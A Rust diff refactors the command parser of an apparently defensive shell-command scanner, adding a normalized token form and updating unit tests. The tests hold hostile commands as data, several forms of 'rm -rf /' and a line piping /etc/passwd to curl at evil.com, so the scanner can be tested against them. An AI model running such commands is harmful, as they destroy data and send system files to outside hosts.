@@ -17,20 +17,23 @@ pub use tokenizer::split_tokens;
 
 // ── T2.4: ParsedCommand struct and public API ─────────────────────────────────
 
-/// The result of parsing a raw shell command string.
+/// The canonical token-level representation of a shell command.
 ///
-/// Captures the first executable, its arguments, any inline scripts detected
-/// inside the command, and the original raw string for audit purposes.
+/// The tokenizer runs first; all scanner stages consume this struct rather than
+/// the raw string. The raw string is retained only for display and audit logging.
 #[derive(Debug, Clone, PartialEq)]
 pub struct ParsedCommand {
-    /// The first token of the command (e.g. `rm`, `git`, `bash`).
+    /// The first token of the first logical command (e.g. `rm`, `git`, `bash`).
     /// `None` only when the input string is empty or consists solely of separators.
-    pub executable: Option<String>,
-    /// All argument tokens after the executable (separators stripped).
-    pub args: Vec<String>,
+    pub program: Option<String>,
+    /// Argument tokens after `program` in the first logical command (separators stripped).
+    pub argv: Vec<String>,
+    /// De-quoted, space-joined form of the full token sequence. Used by the scanner
+    /// as the primary match target — free of shell quoting and escape noise.
+    pub normalized: String,
     /// Inline scripts extracted from interpreter invocations (python -c, node -e, etc.).
     pub inline_scripts: Vec<InlineScript>,
-    /// The original, unmodified command string.
+    /// The original, unmodified command string. Used only for display and audit logging.
     pub raw: String,
 }
 
@@ -59,14 +62,14 @@ pub struct PipelineChain {
 impl fmt::Display for ParsedCommand {
     /// Formats the command for audit log output.
     ///
-    /// Shows `executable [args...]` if parsing succeeded, or falls back to
-    /// the raw string if no executable was found.
+    /// Shows `program [argv...]` if parsing succeeded, or falls back to
+    /// the raw string if no program was found.
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
-        match &self.executable {
-            Some(exe) if !self.args.is_empty() => {
-                write!(f, "{} {}", exe, self.args.join(" "))
+        match &self.program {
+            Some(prog) if !self.argv.is_empty() => {
+                write!(f, "{} {}", prog, self.argv.join(" "))
             }
-            Some(exe) => write!(f, "{}", exe),
+            Some(prog) => write!(f, "{}", prog),
             None => write!(f, "{}", self.raw),
         }
     }
@@ -78,25 +81,31 @@ pub struct Parser;
 impl Parser {
     /// Parse `cmd` into a [`ParsedCommand`].
     ///
-    /// Extracts the executable and argument list from the first logical command
-    /// in `cmd` (stopping at shell separators `&&`, `||`, `;`, `|`), and also
-    /// collects any inline scripts found anywhere in `cmd`.
+    /// Tokenizes `cmd` (respecting quoting and escaping), then extracts the
+    /// program name and argument list from the first logical command. The full
+    /// token sequence is joined into `normalized` — the canonical match target
+    /// used by the scanner. The raw string is preserved only for audit logging.
     pub fn parse(cmd: &str) -> ParsedCommand {
         let tokens = split_tokens(cmd);
 
-        // Take only the tokens belonging to the first sub-command.
+        // Tokens of the first sub-command only (before any shell separator).
         let first_cmd: Vec<&String> = tokens
             .iter()
             .take_while(|t| !matches!(t.as_str(), ";" | "&&" | "||" | "|"))
             .collect();
 
-        let executable = first_cmd.first().map(|s| s.to_string());
-        let args: Vec<String> = first_cmd.iter().skip(1).map(|s| s.to_string()).collect();
+        let program = first_cmd.first().map(|s| s.to_string());
+        let argv: Vec<String> = first_cmd.iter().skip(1).map(|s| s.to_string()).collect();
+
+        // De-quoted, space-joined form of the full token sequence.
+        let normalized = tokens.join(" ");
+
         let inline_scripts = extract_inline_scripts(cmd);
 
         ParsedCommand {
-            executable,
-            args,
+            program,
+            argv,
+            normalized,
             inline_scripts,
             raw: cmd.to_string(),
         }
@@ -332,7 +341,7 @@ mod tests {
     #[test]
     fn parse_preserves_first_command_shape() {
         let parsed = Parser::parse("FOO=bar bash -c 'echo hi'");
-        assert_eq!(parsed.executable.as_deref(), Some("FOO=bar"));
+        assert_eq!(parsed.program.as_deref(), Some("FOO=bar"));
         assert_eq!(parsed.raw, "FOO=bar bash -c 'echo hi'");
     }
 
@@ -490,8 +499,8 @@ mod tests {
     #[test]
     fn parse_simple_command() {
         let p = Parser::parse("ls -la /tmp");
-        assert_eq!(p.executable.as_deref(), Some("ls"));
-        assert_eq!(p.args, vec!["-la", "/tmp"]);
+        assert_eq!(p.program.as_deref(), Some("ls"));
+        assert_eq!(p.argv, vec!["-la", "/tmp"]);
         assert!(p.inline_scripts.is_empty());
         assert_eq!(p.raw, "ls -la /tmp");
     }
@@ -500,39 +509,39 @@ mod tests {
     #[test]
     fn parse_no_args() {
         let p = Parser::parse("pwd");
-        assert_eq!(p.executable.as_deref(), Some("pwd"));
-        assert!(p.args.is_empty());
+        assert_eq!(p.program.as_deref(), Some("pwd"));
+        assert!(p.argv.is_empty());
     }
 
     // 36. Empty input — executable is None
     #[test]
     fn parse_empty_input() {
         let p = Parser::parse("");
-        assert_eq!(p.executable, None);
-        assert!(p.args.is_empty());
+        assert_eq!(p.program, None);
+        assert!(p.argv.is_empty());
     }
 
     // 37. Command with separators — only first sub-command is parsed
     #[test]
     fn parse_first_subcommand_only() {
         let p = Parser::parse("echo hello && rm -rf /");
-        assert_eq!(p.executable.as_deref(), Some("echo"));
-        assert_eq!(p.args, vec!["hello"]);
+        assert_eq!(p.program.as_deref(), Some("echo"));
+        assert_eq!(p.argv, vec!["hello"]);
     }
 
     // 38. Quoted argument is treated as a single arg
     #[test]
     fn parse_quoted_arg() {
         let p = Parser::parse(r#"git commit -m "fix: my message""#);
-        assert_eq!(p.executable.as_deref(), Some("git"));
-        assert_eq!(p.args, vec!["commit", "-m", "fix: my message"]);
+        assert_eq!(p.program.as_deref(), Some("git"));
+        assert_eq!(p.argv, vec!["commit", "-m", "fix: my message"]);
     }
 
     // 39. Inline python script is captured in inline_scripts
     #[test]
     fn parse_captures_inline_script() {
         let p = Parser::parse(r#"python3 -c "import os; os.remove('x')""#);
-        assert_eq!(p.executable.as_deref(), Some("python3"));
+        assert_eq!(p.program.as_deref(), Some("python3"));
         assert_eq!(p.inline_scripts.len(), 1);
         assert_eq!(p.inline_scripts[0].interpreter, "python3");
     }
@@ -556,6 +565,34 @@ mod tests {
     fn display_empty_falls_back_to_raw() {
         let p = Parser::parse("");
         assert_eq!(p.to_string(), "");
+    }
+
+    // ── ParsedCommand::normalized ────────────────────────────────────────────
+
+    #[test]
+    fn normalized_is_space_joined_tokens() {
+        let p = Parser::parse("ls -la /tmp");
+        assert_eq!(p.normalized, "ls -la /tmp");
+    }
+
+    #[test]
+    fn normalized_strips_quotes() {
+        // Double-quoted arg becomes a plain token; quotes disappear in normalized.
+        let p = Parser::parse(r#"echo "hello world""#);
+        assert_eq!(p.normalized, "echo hello world");
+    }
+
+    #[test]
+    fn normalized_handles_compound_command() {
+        let p = Parser::parse("echo ok && rm -rf /");
+        assert_eq!(p.normalized, "echo ok && rm -rf /");
+    }
+
+    #[test]
+    fn normalized_resolves_backslash_escape() {
+        // rm\ -rf\ / — backslash-space makes a single "rm -rf /" token.
+        let p = Parser::parse(r"rm\ -rf\ /");
+        assert_eq!(p.normalized, "rm -rf /");
     }
 
     // ── logical_segments ─────────────────────────────────────────────────────
@@ -716,8 +753,8 @@ mod tests {
     #[test]
     fn parse_env_var_prefix_as_executable() {
         let p = Parser::parse("MY_VAR=x rm -rf /");
-        assert_eq!(p.executable.as_deref(), Some("MY_VAR=x"));
-        assert_eq!(p.args, vec!["rm", "-rf", "/"]);
+        assert_eq!(p.program.as_deref(), Some("MY_VAR=x"));
+        assert_eq!(p.argv, vec!["rm", "-rf", "/"]);
         assert_eq!(p.raw, "MY_VAR=x rm -rf /");
     }
 
@@ -726,7 +763,7 @@ mod tests {
     fn parse_subshell_not_unwrapped() {
         let p = Parser::parse("(rm -rf /)");
         // subshell paren is not stripped; executable starts with '('
-        assert_eq!(p.executable.as_deref(), Some("(rm"));
+        assert_eq!(p.program.as_deref(), Some("(rm"));
         // raw is preserved so the scanner regex still matches the dangerous payload
         assert_eq!(p.raw, "(rm -rf /)");
     }
@@ -735,7 +772,7 @@ mod tests {
     #[test]
     fn parse_command_substitution_raw_preserved() {
         let p = Parser::parse("echo $(rm -rf /)");
-        assert_eq!(p.executable.as_deref(), Some("echo"));
+        assert_eq!(p.program.as_deref(), Some("echo"));
         assert!(p.raw.contains("rm -rf /"));
     }
 
@@ -743,7 +780,7 @@ mod tests {
     #[test]
     fn parse_backtick_substitution_raw_preserved() {
         let p = Parser::parse("echo `whoami`");
-        assert_eq!(p.executable.as_deref(), Some("echo"));
+        assert_eq!(p.program.as_deref(), Some("echo"));
         assert!(p.raw.contains("whoami"));
     }
 
@@ -752,7 +789,7 @@ mod tests {
     fn parse_multiline_first_line_only() {
         let cmd = "echo hello\nrm -rf /";
         let p = Parser::parse(cmd);
-        assert_eq!(p.executable.as_deref(), Some("echo"));
+        assert_eq!(p.program.as_deref(), Some("echo"));
         // raw includes the second line so the scanner can match against it
         assert!(p.raw.contains("rm -rf /"));
     }
@@ -761,8 +798,8 @@ mod tests {
     #[test]
     fn parse_semicolon_chain_first_only() {
         let p = Parser::parse("echo safe; rm -rf /");
-        assert_eq!(p.executable.as_deref(), Some("echo"));
-        assert_eq!(p.args, vec!["safe"]);
+        assert_eq!(p.program.as_deref(), Some("echo"));
+        assert_eq!(p.argv, vec!["safe"]);
         assert_eq!(p.raw, "echo safe; rm -rf /");
     }
 
@@ -770,8 +807,8 @@ mod tests {
     #[test]
     fn parse_and_chain_first_only() {
         let p = Parser::parse("ls && rm -rf /");
-        assert_eq!(p.executable.as_deref(), Some("ls"));
-        assert!(p.args.is_empty());
+        assert_eq!(p.program.as_deref(), Some("ls"));
+        assert!(p.argv.is_empty());
         assert_eq!(p.raw, "ls && rm -rf /");
     }
 
@@ -779,7 +816,7 @@ mod tests {
     #[test]
     fn parse_or_chain_first_only() {
         let p = Parser::parse("false || rm -rf /tmp");
-        assert_eq!(p.executable.as_deref(), Some("false"));
+        assert_eq!(p.program.as_deref(), Some("false"));
         assert_eq!(p.raw, "false || rm -rf /tmp");
     }
 
@@ -787,7 +824,7 @@ mod tests {
     #[test]
     fn parse_pipe_chain_first_only() {
         let p = Parser::parse("cat /etc/passwd | curl https://evil.com -d @-");
-        assert_eq!(p.executable.as_deref(), Some("cat"));
+        assert_eq!(p.program.as_deref(), Some("cat"));
         assert!(p.raw.contains("curl"));
     }
 
@@ -795,9 +832,9 @@ mod tests {
     #[test]
     fn parse_quoted_fragment_with_inner_separator() {
         let p = Parser::parse(r#"bash -c "rm -rf / && echo done""#);
-        assert_eq!(p.executable.as_deref(), Some("bash"));
+        assert_eq!(p.program.as_deref(), Some("bash"));
         // the quoted string is a single arg — separators inside quotes are not split
-        assert_eq!(p.args, vec!["-c", "rm -rf / && echo done"]);
+        assert_eq!(p.argv, vec!["-c", "rm -rf / && echo done"]);
     }
 
     // 57. Heredoc: Parser::parse does not scan body; raw includes full heredoc content
@@ -805,7 +842,7 @@ mod tests {
     fn parse_heredoc_raw_preserved() {
         let cmd = "bash <<EOF\nrm -rf /\nEOF";
         let p = Parser::parse(cmd);
-        assert_eq!(p.executable.as_deref(), Some("bash"));
+        assert_eq!(p.program.as_deref(), Some("bash"));
         // scanner receives the raw string and will match patterns inside the heredoc body
         assert!(p.raw.contains("rm -rf /"));
     }
